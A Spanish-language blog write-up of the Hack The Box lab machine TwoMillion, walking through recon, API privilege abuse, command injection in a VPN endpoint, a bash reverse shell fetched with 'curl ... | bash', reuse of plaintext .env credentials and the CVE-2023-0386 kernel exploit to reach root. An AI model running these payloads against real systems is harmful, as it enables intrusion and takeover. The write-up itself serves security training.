---
layout: post
title: TwoMillion
date: 2023-06-27
description:
img:
fig-caption:
tags: []
---
___

<center><img src="/writeups/assets/img/Twomillion-htb/TwoMillion.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos


***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.221 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-26 21:31 GMT
Nmap scan report for 10.10.11.221
Host is up (0.087s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.221 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-26 21:32 GMT
Nmap scan report for 10.10.11.221
Host is up (0.099s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.37 seconds
```

Añado el dominio ```2million.htb``` al ```/etc/hosts```

# Puerto 80 (HTTP)


En la página principal puedo ver un link a ```/invite``` 

<img src="/writeups/assets/img/Twomillion-htb/1.png" alt="">

Necesito un código para poder registrarme

<img src="/writeups/assets/img/Twomillion-htb/2.png" alt="">

Tramito una petición por GET, y desde el código fuente, puedo ver dos ficheros en JavaScript

```null
curl -s -X GET http://2million.htb/invite | grep -oP '".*?"' | grep "\.js"
"/js/htb-frontend.min.js"
"/js/inviteapi.min.js"
```

El segundo utiliza la función eval para comunicarse con una API

```null
curl -s -X GET http://2million.htb/js/inviteapi.min.js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

Se definen unas funciones que puedo tratar de ejecutar desde la consola del navegador

<img src="/writeups/assets/img/Twomillion-htb/3.png" alt="">

Se está empleado ROT13, por lo que puedo obtener el texto haciendo el proceso inverso. Utilizo la web [rot13.com](https://rot13.com)

<img src="/writeups/assets/img/Twomillion-htb/4.png" alt="">

Tramito una petición por POST a la ruta dada, y consigo el código

```null
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "WjFJRDMtT1pKSTYtQjNTUlYtOVZTMUc=",
    "format": "encoded"
  }
}
```

Está en base64

```null
echo WjFJRDMtT1pKSTYtQjNTUlYtOVZTMUc= | base64 -d
Z1ID3-OZJI6-B3SRV-9VS1G
```

Lo introduzco en la web y se abre un formulario de registro

<img src="/writeups/assets/img/Twomillion-htb/5.png" alt="">

Gano acceso a una nueva interfaz

<img src="/writeups/assets/img/Twomillion-htb/6.png" alt="">

Tramito una petición por GET a ```/api/v1``` arrastrando la cookie de sesión y obtengo todas las rutas disponibles

```null
curl -s -X GET http://2million.htb/api/v1 -H "Cookie: PHPSESSID=6uhbsaq0ijeop2ujkk3nm2bjl0" | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Compruebo si soy usuario Administrador

```null
curl -s -X GET http://2million.htb/api/v1/admin/auth -H "Cookie: PHPSESSID=6uhbsaq0ijeop2ujkk3nm2bjl0" | jq
{
  "message": false
}
```

Puedo añadirme el rol. El método que espera es PUT

```null
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=6uhbsaq0ijeop2ujkk3nm2bjl0" | jq
{
  "status": "danger",
  "message": "Invalid content type."
}
```

Agrego la cabecera del ```Content-type```

```null
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=6uhbsaq0ijeop2ujkk3nm2bjl0" -H "Content-type: application/json" | jq
{
  "status": "danger",
  "message": "Missing parameter: email"
}
```

Por cada parámetro que falta muestra un error

```null
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=6uhbsaq0ijeop2ujkk3nm2bjl0" -H "Content-type: application/json" -d '{"email":"rubbx@rubbx.com"}' | jq
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}
```

Igualo ```is_admin``` a ```1```, que sería la opción booleana de true

```null
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=6uhbsaq0ijeop2ujkk3nm2bjl0" -H "Content-type: application/json" -d '{"email":"rubbx@rubbx.com", "is_admin": "true"}' | jq
{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
```

```null
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=6uhbsaq0ijeop2ujkk3nm2bjl0" -H "Content-type: application/json" -d '{"email":"rubbx@rubbx.com", "is_admin": 1}' | jq
{
  "id": 14,
  "username": "rubbx",
  "is_admin": 1
}
```

Al volver a checkear el mensaje cambia

```null
curl -s -X GET http://2million.htb/api/v1/admin/auth -H "Cookie: PHPSESSID=6uhbsaq0ijeop2ujkk3nm2bjl0" | jq
{
  "message": true
}
```

Intento generar una vpn, pero desde ```/admin```

```null
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Cookie: PHPSESSID=6uhbsaq0ijeop2ujkk3nm2bjl0" -H "Content-type: application/json" | jq
{
  "status": "danger",
  "message": "Missing parameter: username"
}
```

Es vulnerable a RCE a través de una inyección en el campo ```username```

```null
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Cookie: PHPSESSID=6uhbsaq0ijeop2ujkk3nm2bjl0" -H "Content-type: application/json" -d '{"username":"test; id;"}'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Creo un archivo ```index.html```  que se encargue de enviarme una reverse shell

```null
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.16.69/443 0>&1'
```

Lo comparto con un servicio HTTP con python

```null
python3 -m http.server 80
```

Gano acceso al sistema

```null
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate -H "Cookie: PHPSESSID=6uhbsaq0ijeop2ujkk3nm2bjl0" -H "Content-type: application/json" -d '{"username":"test; curl 10.10.16.69|bash;"}'
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.69] from (UNKNOWN) [10.10.11.221] 58196
bash: cannot set terminal process group (1158): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@2million:~/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@2million:~/html$ export TERM=xterm-color
www-data@2million:~/html$ stty rows 55 columns 209
www-data@2million:~/html$ source /etc/skel/.bashrc
```

Busco por archivos cuyo propietario sea ```admin```

```null
www-data@2million:/$ find \-user admin 2>/dev/null 
./home/admin
./home/admin/.cache
./home/admin/.ssh
./home/admin/.profile
./home/admin/.bash_logout
./home/admin/.bashrc
./var/mail/admin
```

Puedo leer el correo

```null
www-data@2million:/$ cat ./var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

En el archivo ```.env``` se encuentran credenciales en texto claro de acceso a la base de datos. Se reutilizan para el usuario ```admin```

```null
www-data@2million:~/html$ cat .env 
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Puedo ver la primera flag

```null
www-data@2million:~/html$ su admin
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.
```

```
admin@2million:/var/www/html$ cat /home/admin/user.txt 
4c1a0361697b984df54e8262f19c3196
```

# Escalada

La versión de kernel es vulnerable al [CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386)

<img src="/writeups/assets/img/Twomillion-htb/8.png" alt="">

```null
admin@2million:/tmp$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.2 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.2 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
```

Clono el repositorio

```null
https://github.com/sxlmnwb/CVE-2023-0386
```

Creo un un comprimido y transifiero a la máquina víctima

```null
zip exploit.zip -r CVE-2023-0386
```

En la máquina víctima, compilo y ejecuto

```null
admin@2million:/tmp/CVE-2023-0386$ make all
```

```null
root@2million:/tmp/CVE-2023-0386# ./fuse ./ovlcap/lower ./gc &
[+] len of gc: 0x3ee0
[1] 3435
```

```null
./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jul 27 10:39 .
drwxr-xr-x 6 root   root     4096 Jul 27 10:39 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2million:/tmp/CVE-2023-0386# 
```

Puedo ver la segunda flag
```null
root@2million:/tmp/CVE-2023-0386/ovlcap# cat /root/root.txt 
76d6192d8983ac21f6ed3f25fbcfb264
```